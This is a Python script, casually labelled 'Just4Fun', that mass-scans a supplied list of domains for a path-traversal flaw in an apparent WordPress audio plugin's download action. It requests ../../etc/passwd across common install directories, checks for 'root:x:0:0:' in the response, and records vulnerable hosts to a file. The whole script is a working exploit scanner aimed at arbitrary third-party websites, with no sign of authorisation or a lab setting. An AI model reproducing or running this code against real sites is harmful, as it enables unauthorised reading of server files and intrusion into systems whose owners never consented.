# Just4Fun

import sys
import requests
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def jan_Cok(target):
	try:
		s = requests.Session()
		req = requests.Request(method='GET' , url=target)
		prep = req.prepare()
		prep.url = target
		r = s.send(prep, verify=False)

	
		if "root:x:0:0:" in r.text:
			print("[*] Vuln -> "+target)
			# save result
			open("vuln.txt", "a").write(target+"\n")
		else:
			print("[!] Not_Vuln -> "+target)
	except:
		pass
try:
	data = []
	liss = [i.strip() for i in open(sys.argv[1], "r").readlines()]
	for i in liss:
		domain = i.replace("http://", "").replace("https://", "").replace("/", "")

		# You can add a new common directory here
		common_dir = ['/backup', '/new', '/old', '/wp', '/test', '/wordpress', '/']

		# add a common list 
		for cd in common_dir:
			url = "http://"+domain+cd+"/MYzoomsounds/?action=dzsap_download&link=../../../../../../../../../../etc/passwd"
			data.append(url)


	x = Pool(int(sys.argv[2]))
	x.map(jan_Cok, data)
except Exception as e:
	print(e)
	print("Usage : wp-install.py file_list ThreadPool")
